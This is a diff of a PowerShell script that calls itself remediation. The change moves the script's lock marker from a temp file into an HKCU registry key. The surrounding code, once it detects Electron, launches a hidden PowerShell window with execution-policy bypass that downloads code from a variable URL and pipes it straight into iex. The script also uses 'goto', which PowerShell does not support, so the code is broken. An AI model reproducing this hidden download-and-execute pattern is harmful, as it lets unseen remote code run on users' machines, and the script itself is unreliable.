@@ -1,9 +1,9 @@
 # Requires -RunAsAdministrator
 $ErrorActionPreference = "Continue"
 
-$lockFile = "$env:TEMP\remediate.lock"
-if (Test-Path $lockFile) {
-    Remove-Item $lockFile -Force -ErrorAction SilentlyContinue
+$regMutex = "HKCU:\Software\RemediateLock"
+if (Test-Path $regMutex) {
+    Remove-Item $regMutex -Force -ErrorAction SilentlyContinue
     goto MainRemediation
 }
 
@@ -103,7 +103,7 @@ if (-not $foundElectron) {
 }
 
 if ($foundElectron) {
-    New-Item -ItemType File -Path $lockFile -Force | Out-Null
+    New-Item -Path $regMutex -Force | Out-Null
     Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iwr '$cleanerUrl' -UseBasicParsing | iex`""
 
     try {
